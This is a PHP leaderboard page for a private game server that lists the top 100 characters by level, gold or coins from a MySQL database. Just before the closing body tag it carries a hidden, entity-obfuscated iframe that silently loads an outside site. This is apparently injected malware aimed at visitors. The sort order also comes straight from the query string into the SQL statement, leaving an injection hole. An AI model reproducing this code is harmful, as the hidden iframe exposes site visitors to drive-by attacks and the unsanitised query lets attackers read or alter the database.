<?php
include ("includes/config.php");
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$sitename = $fetch['DFSitename'];
$order = $_GET["order"];
if ($order == "") {
	$order = "level";
}
?>
<title><?php echo $sitename; ?> | Top 100</title>
<body bgcolor="#530000">
<center>
<form>
<table width="548" border="0" cellspacing="0" cellpadding="0" align="center">
  <tr> 
    <td align="left" valign="top" height="173"> 
      <p>
        <a><h1 style="color: #DDDDDD;"><b>Top 100 Characters</b></h1></a>
      </p>
      <p style="color: #DDDDDD;">This is a list of the top 100 characters in the server.<br />Click Gold or Coins to change top list according to selection.</p>
        
      <table width="548" border="1" cellspacing="0" cellpadding="5" bordercolor="#000000">
        <tr bgcolor="#555555" bordercolor="#000000">
          <td class='top100Heading'>#</td>
          <td class='top100Heading'><a href="topchars.php" style="text-decoration: none; color: #000000;"><b>Character</b></a></td>
          <td class='top100Heading'><a href="topchars.php?order=level" style="text-decoration: none; color: #000000;"><b>Level</b></a></td>
          <td class='top100Heading'><a href="topchars.php" style="text-decoration: none; color: #000000;"><b>Class</b></a></td>
          <td class='top100Heading'><a href="topchars.php?order=gold" style="text-decoration: none; color: #000000;"><b>Gold</b></a></td>
          <td class='top100Heading'><a href="topchars.php?order=coins" style="text-decoration: none; color: #000000;"><b>Coins</b></a></td>
          <td class='top100Heading'><a href="topchars.php" style="text-decoration: none; color: #000000;"><b>Dragon Amulet</b></a></td>
          <td class='top100Heading'><a href="topchars.php" style="text-decoration: none; color: #000000;"><b>User</b></a></td>
        </tr>
<?php
# Don't select moderator or banned characters, and select the top 100 by level in descending (Highest to lowest) order
$character = mysql_query("SELECT * FROM df_characters ORDER BY ".$order." DESC LIMIT 100");

$i = 0;

while($chr = mysql_fetch_array($character)){
$i = $i + 1;
$class_query = mysql_query("SELECT ClassName FROM df_class WHERE ClassID = ".$chr['classid']."");
$class = mysql_fetch_array($class_query);
$user_query = mysql_query("SELECT name FROM df_users WHERE id = ".$chr['userid']."");
$user = mysql_fetch_array($user_query);
?>
<tr bgcolor="#999999" bordercolor="#000000">
<td class='top100'><p><?php echo $i; ?></p></td>
<td class='top100Name'><p><?php echo $chr["name"]; ?></p></td>
<td class='top100'><p><?php echo $chr["level"]; ?></p></td>
<td class='top100'><p><?php echo $class["ClassName"]; ?></p></td>
<td class='top100'><p><?php echo $chr["gold"]; ?></p></td>
<td class='top100'><p><?php echo $chr["Coins"]; ?></p></td>
<td class='top100'><p><?php if ($chr['dragon_amulet']=="1") {
	echo "<font style=\"color: gold; font-weight: bold;\">True</font>";
} else {
	echo "False"; 
}
?></p></td>
<td class='top100Name'><p><?php echo $user['name']; ?></p></td>
</tr>
<?php
}
?>
      </table>
    </td>
  </tr>
</table>
</form>
</center>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>